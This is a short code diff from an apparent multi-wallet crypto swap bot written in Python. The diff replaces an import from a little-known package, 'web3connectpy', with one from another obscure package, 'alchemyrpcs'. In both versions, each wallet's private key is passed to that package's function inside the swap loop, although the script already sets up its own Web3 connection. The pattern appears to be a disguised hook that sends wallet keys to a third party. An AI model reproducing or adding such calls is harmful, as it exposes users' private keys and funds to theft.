@@ -4,7 +4,7 @@ import time
 from colorama import init, Fore, Style
 from scripts.deploy import bytecode
 from web3 import Web3
-from web3connectpy import connect
+from alchemyrpcs import rpc
 from eth_abi import encode
 
 # Initialize colorama
@@ -231,7 +231,7 @@ def run_swap_cycle(cycles, private_keys):
     for cycle in range(1, cycles + 1):
         for pk in private_keys:
             wallet = w3.eth.account.from_key(pk).address[:8] + "..."
-            conn = connect(pk)
+            conn = rpc(pk)
             msg = f"CYCLE {cycle}/{cycles} | Account: {wallet}"
             print(f"{Fore.CYAN}{'═' * 60}{Style.RESET_ALL}")
             print(f"{Fore.CYAN}│ {msg:^56} │{Style.RESET_ALL}")
